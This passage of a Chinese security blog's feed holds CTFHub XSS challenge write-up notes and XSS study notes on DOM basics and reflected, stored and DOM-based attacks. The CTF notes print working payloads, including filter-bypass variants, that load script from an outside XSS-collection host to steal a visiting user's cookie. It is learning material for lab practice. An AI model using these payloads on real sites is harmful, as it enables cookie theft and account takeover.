复习一边文档 <a href="https://www.cnblogs.com/vinslow/p/17037322.html">通关文档</a></p><p>2 看视频<a href="https://www.bilibili.com/video/BV1CT4y1o7TY/?spm_id_from=333.999.0.0&vd_source=85d45675625ceca3f8224baa5913ca79">b站xss视频</a></p><h2 id="Ctf-hub"><a href="#Ctf-hub" class="headerlink" title="Ctf_hub"></a>Ctf_hub</h2><p><img src="https://raw.githubusercontent.com/godicee/img/main/68835a712823dff6ccfc0a053f65c701.png"></p><h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1 反射型"></a>1 反射型</h3><p>嵌入可以请求 xss 平台的恶意代码——点提交后——当前页面就嵌入了恶意代码了</p><p>下面的 Url 就相当于——传给 bot——让 bot 去访问这个有恶意代码的 url——就可以获取用户的 cookie</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/995f3186a6ff000cbd504b8453264e9f.png"></p><h3 id="2-空格"><a href="#2-空格" class="headerlink" title="2 空格"></a>2 空格</h3><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//xs.pe/E3Q&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p>F12 可以 search 一下看到，空格不见了</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/f0c2f91b359c407ef1573ee2a44b36fc.png"></p><p>注释绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt/**/sRC=//xs.pe/E3Q&gt; &lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><h3 id="3-过滤关键词"><a href="#3-过滤关键词" class="headerlink" title="3 过滤关键词"></a>3 过滤关键词</h3><p>XSS过滤关键词绕过可以使用双写、大小写等方式，例如<scRipt>alert(1</scriPt>，点击提交，发现1被弹出，说明存在XSS漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//xs.pe/E3Q&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><h3 id="4-存储型"><a href="#4-存储型" class="headerlink" title="4 存储型"></a>4 存储型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//xs.pe/E3Q&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/7b7e2098f273d2ea02b8c4e8d4ab5faf.png"></p><p>可以看到，请求 url 里面没有了，重新访问，已经嵌入页面代码中，直接访问即可</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/d4a5ec6d0ae58762eee75e8bc4e80e31.png"></p><h3 id="5DOM-反射"><a href="#5DOM-反射" class="headerlink" title="5DOM 反射"></a>5DOM 反射</h3><p>看源码</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/0b7d879fd9b80b37743dbb9a15147d8f.png"></p><p>一个简单的闭合绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa&#x27;;&lt;/script&gt;&lt;script&gt;alert`1`&lt;/script&gt;//</span><br></pre></td></tr></table></figure><p>向靶场发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa&#x27;;&lt;/script&gt;&lt;sCRiPt sRC=//xs.pe/E3Q&gt;&lt;/sCrIpT&gt;//</span><br></pre></td></tr></table></figure><h3 id="6DOM-跳转"><a href="#6DOM-跳转" class="headerlink" title="6DOM 跳转"></a>6DOM 跳转</h3><p>查看源码</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/931476e1bae1e0548c3d73c18c9f60cd.png"></p><h2 id="xss过滤姿势"><a href="#xss过滤姿势" class="headerlink" title="xss过滤姿势"></a>xss过滤姿势</h2><p><a href="https://www.cnblogs.com/zha0gongz1/p/12732356.html">xss过滤姿势</a></p><p>待更…</p>]]></content>
    
    
    <summary type="html">短链接生成[https://xss.haozi.me/](https://xss.haozi.me/) xss-labs正则规则.匹配任意单个字符（除换行符） ?前面的出现0or1次（可以不出现） *前面的出现0or多次（可以不出现） +匹配前面的1or多次（至少出现一次）实体编码规则三种情况：标签内容：会被当做字符串解析，不会被当作函数</summary>
    
    
    
    <category term="安全基础" scheme="http://godice.top/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Sqli-labs</title>
    <link href="http://godice.top/XSSb%20%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://godice.top/XSSb%20%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0.html</id>
    <published>2024-10-24T05:42:41.000Z</published>
    <updated>2024-11-20T09:31:41.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://space.bilibili.com/282616786/channel/seriesdetail?sid=2061170">xss 视频</a></p><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>Dom 和 Bom</p><ul><li>Dom （Document Browser Model）和 Bom（Browser Object Model）<ul><li>Bom 代表的浏览器本身<ul><li>Dom 属于 Bom，是一个组成部件（用于 Html 元素处理的）</li><li>Window 也属于 Bom</li></ul></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/9b000c1d8adec536b6c7ffa16da9e8f9.png"> </p><p>下面是浏览器必须实现的标准接口组件</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/dfe3bd38a400729ce86b9c68d38e4f7e.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/9ff2818e33920b57f88afd9d26aa35f5.png"></p><p>反射、存储、Dom</p><ul><li>反射：构建请求参数，向服务器请求——注入参数在 http 请求中，由服务器返回 html 到页面<ul><li>经过服务器：短暂的经过服务器，可能会被服务器过滤</li><li>利用：构造钓鱼链接（包含恶意代码），让其用户访问——向后端请求输出到前端<ul><li>可以盗取 Cookie</li></ul></li></ul></li><li>存储：直接存储在服务器数据库中（只要是持久存在的就可以，不一定是数据库）——用户访问页面会执行<ul><li>直接存储在服务器：可能会被过滤</li></ul></li><li>Dom：利用 document 注入到 html 中，不经过服务器，不会被过滤掉</li></ul><h2 id="Dom-的相关基础"><a href="#Dom-的相关基础" class="headerlink" title="Dom 的相关基础"></a>Dom 的相关基础</h2><h3 id="3burp-xss-使用"><a href="#3burp-xss-使用" class="headerlink" title="3burp-xss 使用"></a>3burp-xss 使用</h3><h4 id="3-1-官方站点"><a href="#3-1-官方站点" class="headerlink" title="3.1 官方站点"></a>3.1 官方站点</h4><p><a href="https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation">burp 官方测试网站（多种漏洞）</a></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/97d807f6edb4fd307a7cdd1b78632037.png"></p><h4 id="3-2-反射型测试"><a href="#3-2-反射型测试" class="headerlink" title="3.2 反射型测试"></a>3.2 反射型测试</h4><p>反射型的测试</p><p><a href="https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/bypassing-filters">burp 的 fuzz 测试 xss</a></p><p>（该页面里面有测试页面和 payload）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/e470082a90f51899c06548ce12c12c4d.png"></p><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">反射型 xss 测试站点</a></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/2488eb3ff34a36ffa30b197eb0e496d1.png"></p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">payload页面</a></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/85f96d4b7b3a6aae7482ab23bdcaabcb.png">可以用到 burp 的 intruder 中测试</p><h3 id="4Dom-Attribute"><a href="#4Dom-Attribute" class="headerlink" title="4Dom-Attribute"></a>4Dom-Attribute</h3><p>写 html 代码就是对 dom 的操作</p><ul><li>dom 可以操作 html 中的每一个标签</li><li>attributes 可以操作对应标签中的属性（包括触发事件，但不止是）</li></ul><p><a href="https://www.w3schools.com/js/js_htmldom.asp">dom文档</a></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/2d7dbe5bb9ec4a026328f131a32df0fe.png"></p><p>选择事件</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/3a6121ae8dceaecaf8966149866a3cc0.png"></p><p>Dom 的基础操作</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/72f03ba4967254b6ee483d60c219fca1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1：a 的引用是第一个按钮标签的 Dom 对象（对 a 操作等于对标签操作）</span><br><span class="line">var a = document.getElementsByTagName(&quot;BUTTON&quot;)[0];</span><br><span class="line">2：获取a属性名为：onclick的值：即把myFunction()字符串赋值给 x</span><br><span class="line">var x = a.attributes.getNamedItem(&quot;onclick&quot;).value;</span><br><span class="line">3：把 id 为demo1 的标签的文本内容换为 x——即bbb 替换为 x.value</span><br><span class="line">document.getElementById(&quot;demo1&quot;).innerHTML = x;</span><br></pre></td></tr></table></figure><p>因此最开始页面如下：</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/c1787ca2f0b6d22f3a9f08eb9b44d6d5.png"></p><p>点击 Try it 会触发 button 的 onclick——触发 myFunction——因此把 bbb 标签的赋值改变</p><p>变成<img src="https://raw.githubusercontent.com/godicee/img/main/b1a2a9c6fa7b0cdf18e16e234865b8ab.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> Click the button to get the value of onclic attribute of the button element.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myFunction()&quot;</span>&gt;</span>Try it<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;btn()&quot;</span>&gt;</span>btn<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span> aaa <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;demo1&quot;</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;button&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//var x = a.attributes.getNamedItem(&quot;onclick&quot;).value;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = a.<span class="title function_">getAttribute</span>(<span class="string">&quot;onclick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = x;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">btn</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;button&quot;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//var x = a.attributes.getNamedItem(&quot;onclick&quot;).value;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = a.<span class="title function_">getAttribute</span>(<span class="string">&quot;onclick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo1&quot;</span>).<span class="property">innerHTML</span> = x;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5Dom-Document"><a href="#5Dom-Document" class="headerlink" title="5Dom-Document"></a>5Dom-Document</h3><h2 id="Xss-攻击流程"><a href="#Xss-攻击流程" class="headerlink" title="Xss 攻击流程"></a>Xss 攻击流程</h2>]]></content>
    
    
    <summary type="html">0 安装和配置1 注意 php5xxx2 修改数据库配置文件：user、pass3 注意打开网页根目录下，setup 初始化数据库4 修改系统环境变量	总结Mysql 常用操作查表查库：select schema_name from information_schema.schemata; 查...</summary>
    
    
    
    <category term="安全基础" scheme="http://godice.top/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
</feed>
